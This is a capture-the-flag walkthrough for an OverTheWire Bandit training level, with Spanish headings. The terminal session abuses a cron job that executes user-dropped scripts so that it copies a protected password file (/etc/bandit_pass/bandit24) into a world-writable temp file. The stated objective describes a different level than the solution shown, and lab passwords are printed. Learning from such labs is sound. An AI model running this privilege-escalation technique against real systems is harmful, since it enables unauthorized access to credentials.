# Level 24

## Objetivos
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Datos de acceso 
bandit23 <-UserName
 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G<-Password

## Solución 
```bash
bandit23@bandit:~$ ls -la  /etc/cron.d/
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  1 06:30 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat  /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat  /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls-la
ls-la: command not found
bandit23@bandit:/var/spool/bandit24/foo$ ls -la
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/passtmp
bandit23@bandit:/var/spool/bandit24/foo$ cd /tmp/passtmp
bandit23@bandit:/tmp/passtmp$ echo "cat /etc/bandit_pass/bandit24 >> /tmp/passtmp/password" > mio.sh
bandit23@bandit:/tmp/passtmp$ chmod 777 mio.sh
bandit23@bandit:/tmp/passtmp$ ls -la mio.sh
-rwxrwxrwx 1 bandit23 bandit23 55 Sep  3 18:04 mio.sh
bandit23@bandit:/tmp/passtmp$ touch password
bandit23@bandit:/tmp/passtmp$ chmod 666 password
bandit23@bandit:/tmp/passtmp$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Sep  3 18:06 password
bandit23@bandit:/tmp/passtmp$ ls -la
total 84
drwxrwxr-x    2 bandit23 bandit23  4096 Sep  3 18:06 .
drwxrwx-wt 1719 root     root     73728 Sep  3 18:08 ..
-rwxrwxrwx    1 bandit23 bandit23    55 Sep  3 18:04 mio.sh
-rw-rw-rw-    1 bandit23 bandit23     0 Sep  3 18:06 password
bandit23@bandit:/tmp/passtmp$ cp mio.sh /var/spool/bandit24/foo

bandit23@bandit:/tmp/passtmp$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Notas dicionales 